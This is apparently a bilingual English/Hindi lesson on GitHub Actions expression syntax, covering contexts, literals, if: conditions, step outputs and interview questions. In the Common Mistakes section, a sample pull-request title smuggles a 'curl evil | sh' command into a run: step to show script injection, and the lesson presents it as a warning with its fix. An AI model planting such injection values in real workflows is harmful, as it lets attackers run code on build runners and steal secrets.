# 271. Expression Syntax ${{ }}
# हिंदी में: Expression Syntax ${{ }} (GitHub Actions में dynamic values)

---

## 🔵 Simple Definition (English)
An **expression** is a small piece of code written inside `${{ }}` that GitHub evaluates at runtime. It reads values from **contexts** (`github`, `env`, `secrets`, `matrix`, `needs`, `steps` ...) and can use operators and functions.
It lets one static YAML file behave differently per branch, per event, per matrix cell.

## 🔵 सरल परिभाषा (Hindi)
**Expression** वह छोटा code है जो `${{ }}` के अंदर लिखा जाता है और GitHub उसे runtime पर evaluate करता है। यह **contexts** (`github`, `env`, `secrets`, `matrix`, `needs`, `steps` ...) से values पढ़ता है और operators/functions use कर सकता है।
इससे एक ही static YAML file हर branch, हर event और हर matrix cell के लिए अलग तरह से behave करती है।

---

## 🔴 Problem it Solves
YAML is static text. Without expressions you would need a separate workflow file for `main` and for `develop`, one for Node 18 and one for Node 20, and you could not pass the commit SHA into an image tag. Expressions give you variables, conditions and data passing between steps and jobs without writing custom scripts.

## 🔴 यह क्यों बना? (Hindi)
YAML अपने आप में static text है। Expressions के बिना `main` और `develop` के लिए अलग-अलग workflow files बनानी पड़तीं, Node 18 और Node 20 के लिए भी अलग, और commit SHA को image tag में डालना possible नहीं होता। Expressions से variables, conditions और steps/jobs के बीच data passing बिना custom script के मिलती है।

---

## 🟢 How it Works — Step by Step

```
Step 1 → Event happens (push / pull_request / schedule ...)
Step 2 → GitHub builds the contexts (github, env, vars, secrets, ...)
Step 3 → The runner (or GitHub server) scans YAML values for ${{ ... }}
Step 4 → Each expression is evaluated: context lookup + operators + functions
Step 5 → Result is converted to a string and substituted into the YAML value
Step 6 → The step runs with the final text (secrets are masked in logs)
```

Important: substitution happens BEFORE the shell sees the script. The shell never sees `${{ }}`; it sees the final text.

## 🟢 कैसे काम करता है? (Hindi)

```
Step 1 → Event आता है (push / pull_request / schedule ...)
Step 2 → GitHub contexts बनाता है (github, env, vars, secrets, ...)
Step 3 → YAML values में ${{ ... }} ढूँढा जाता है
Step 4 → हर expression evaluate होता है: context lookup + operators + functions
Step 5 → Result string बनकर YAML value में replace हो जाता है
Step 6 → Step final text के साथ run होता है (logs में secrets mask रहते हैं)
```

ज़रूरी बात: replacement shell के script देखने से पहले होता है। Shell को कभी `${{ }}` नहीं दिखता, उसे final text दिखता है।

---

## 🟡 Real World Example
Your team pushes to `main` of a Node.js API. The workflow must build the Docker image tagged with the short commit SHA, but on pull requests it must only run tests and never push the image. One file handles both using `github.event_name`, `github.sha` and an `if:` condition. Same file, different behaviour, no duplication.

## 🟡 Real Example Hindi mein
आपकी team Node.js API के `main` branch पर push करती है। Workflow को Docker image short commit SHA के tag के साथ build करनी है, लेकिन pull request पर सिर्फ tests चलाने हैं और image push नहीं करनी। एक ही file `github.event_name`, `github.sha` और `if:` condition से दोनों cases संभालती है।

---

## 💻 Code / Config Example — Basic
```yaml
# .github/workflows/expr-basic.yml
name: expr-basic                       # workflow name shown in the Actions tab

on: [push, pull_request]               # run on both events

jobs:
  demo:                                # job id
    runs-on: ubuntu-latest             # GitHub-hosted Linux runner
    steps:
      - name: Print basic contexts     # human readable step name
        run: |                         # multi-line shell script
          echo "Repo:   ${{ github.repository }}"   # e.g. addyrj/my-api
          echo "Branch: ${{ github.ref_name }}"     # e.g. main
          echo "Event:  ${{ github.event_name }}"   # push or pull_request
          echo "Actor:  ${{ github.actor }}"        # user who triggered it

      - name: Only on main             # conditional step
        if: github.ref == 'refs/heads/main'   # `if` needs NO ${{ }} wrapper
        run: echo "This is main branch"       # runs only on main

      - name: Literals demo            # literals inside an expression
        run: |
          echo "${{ true }} ${{ 42 }} ${{ 'single quoted string' }} ${{ null }}"
          # strings MUST use single quotes inside expressions; "double" is an error
```

## 💻 Code / Config Example — Advanced
```yaml
# .github/workflows/expr-advanced.yml
name: expr-advanced                    # workflow name

on:
  push:
    branches: [main, develop]          # build on both long-lived branches
  pull_request:
    branches: [main]                   # PRs targeting main

env:
  IMAGE: ghcr.io/${{ github.repository }}   # expression allowed in env values
  SHORT_SHA: ${{ github.sha }}              # full SHA (cut to 7 chars below)

jobs:
  build:
    runs-on: ubuntu-latest             # runner label
    outputs:
      tag: ${{ steps.meta.outputs.tag }}    # expose step output to other jobs
    steps:
      - uses: actions/checkout@v4      # example version, update to latest v4/v5
      - name: Compute image tag
        id: meta                       # id so we can read steps.meta.outputs
        run: |
          # keep first 7 chars of SHA; ${{ }} is replaced before bash runs
          echo "tag=${SHORT_SHA::7}" >> "$GITHUB_OUTPUT"   # write output
      - name: Print object filter
        run: echo '${{ toJSON(github.event.commits.*.message) }}'
        # `.*` is the object filter syntax: collects every commit message

  deploy:
    needs: build                       # wait for build job
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production            # protection rules / env secrets
    steps:
      - name: Deploy tag
        env:
          TAG: ${{ needs.build.outputs.tag }}   # pass via env, not inline
        run: echo "Deploying $IMAGE:$TAG"       # shell variable, injection-safe
```
Not run locally; YAML structure was parsed with PyYAML. Action versions are examples.

---

## 🟠 My Stack Integration
For a Node.js / FastAPI app on a VPS behind Nginx, use expressions to pick the target server and image tag per branch: `develop` goes to staging VPS, `main` goes to production VPS.

```yaml
# snippet: choose host by branch
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Pick host
        id: target
        run: |
          if [ "${{ github.ref_name }}" = "main" ]; then
            echo "host=prod.example.com" >> "$GITHUB_OUTPUT"     # production VPS
          else
            echo "host=staging.example.com" >> "$GITHUB_OUTPUT"  # staging VPS
          fi
      - name: SSH deploy
        run: ssh deploy@${{ steps.target.outputs.host }} "docker compose pull && docker compose up -d"
        # requires an SSH key configured earlier in the job (see secrets topics)
```

---

## ⚠️ Common Mistakes to Avoid
❌ Mistake 1: Using double quotes for a string: `if: github.ref == "refs/heads/main"`.
✅ Correct: Single quotes: `if: github.ref == 'refs/heads/main'`.

❌ Mistake 2: `if: ${{ github.ref }} == 'refs/heads/main'` (text outside the braces becomes a non-empty string, which is always truthy).
✅ Correct: Put the whole comparison inside, or skip braces entirely: `if: github.ref == 'refs/heads/main'`.

❌ Mistake 3: Putting `${{ github.event.pull_request.title }}` straight into `run:`. A title like `"; curl evil | sh #` becomes shell code (script injection).
✅ Correct: Map to `env:` first and use `"$PR_TITLE"` in the script.

❌ Mistake 4: Starting a YAML value with `${{` unquoted in some places, e.g. `if: ${{ a }} && ${{ b }}`.
✅ Correct: One expression: `if: ${{ a && b }}`; quote the value if it begins with `${{`.

---

## 🧠 Tricky Interview Question
`if: ${{ matrix.os }} == 'ubuntu-latest'` — job always runs even on windows. Why?

Answer: When `${{ }}` is mixed with other text, GitHub treats the whole value as a string: `"ubuntu-latest == 'ubuntu-latest'"` (or `"windows-latest == 'ubuntu-latest'"`). Any non-empty string is truthy, so the step runs every time. Write `if: matrix.os == 'ubuntu-latest'`.

---

## ⚫ Interview Questions + Answers

Q1: What is the difference between an expression and a shell variable?
A1: An expression `${{ }}` is evaluated by GitHub before the step starts and pasted as text. A shell variable `$VAR` is evaluated by bash while the step runs.

Q2: Do you need `${{ }}` in `if:`?
A2: No. `if:` is automatically evaluated as an expression. Braces are optional there, but required in most other keys (`env`, `with`, `run`, `name`).

Q3: Which literal types exist?
A3: boolean (`true`/`false`), null, number (including hex and exponent), and string (single quotes; escape a quote by doubling it `''`).

Q4: What is the object filter `*`?
A4: `github.event.commits.*.message` returns an array of the `message` from every commit. Often combined with `contains()` or `toJSON()`.

Q5: How is script injection through expressions prevented?
A5: Never interpolate untrusted data (issue titles, PR body, branch names) into `run:`. Assign it to an environment variable and reference the shell variable; also limit `GITHUB_TOKEN` permissions.

---

## 🔷 When to Use + When Not to Use
✅ Use when:
- You need conditions, per-branch values, image tags from the SHA.
- You pass outputs between steps and jobs.
- You read matrix values.

❌ Avoid when:
- A complex logic is needed: put it in a script file and call it.
- The value is untrusted user input going into `run:`.
- You want runtime shell values (use `$VAR` instead).

---

## 📊 Visual Diagram
```
 workflow.yml (static text)
        |
        v
 +-----------------------+      contexts: github, env, vars,
 |  expression engine    | <--- secrets, needs, steps, matrix,
 |  ${{ a == b && f(x) }}|      runner, job, inputs
 +-----------+-----------+
             | result -> string
             v
   "echo deploy to prod.example.com"   <-- final text
             |
             v
         bash / step runs
```

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| Expression | Code inside `${{ }}` evaluated at runtime | Runtime पर चलने वाला code |
| Context | Object holding run data (github, env ...) | Run की जानकारी वाला object |
| Literal | Fixed value: true, 1, 'text', null | Fixed value |
| Object filter | `.*` syntax to collect properties of an array | Array से property निकालना |
| Script injection | Untrusted text becoming code | Untrusted text का code बन जाना |

---

## ⚡ 3-Line Summary
English: `${{ }}` evaluates contexts, operators and functions before the shell runs.
`if:` does not need braces; strings use single quotes.
Never put untrusted input directly into `run:`; use `env:`.

Hindi: `${{ }}` shell चलने से पहले contexts, operators और functions evaluate करता है।
`if:` में braces ज़रूरी नहीं; strings में single quotes लगते हैं।
Untrusted input को सीधे `run:` में मत डालो; `env:` use करो।

---

## ➡️ Next Topic
**272. Operators in Expressions** — now that you can read values, learn how to compare and combine them (`==`, `&&`, `!`, `<` ...) to build real conditions.
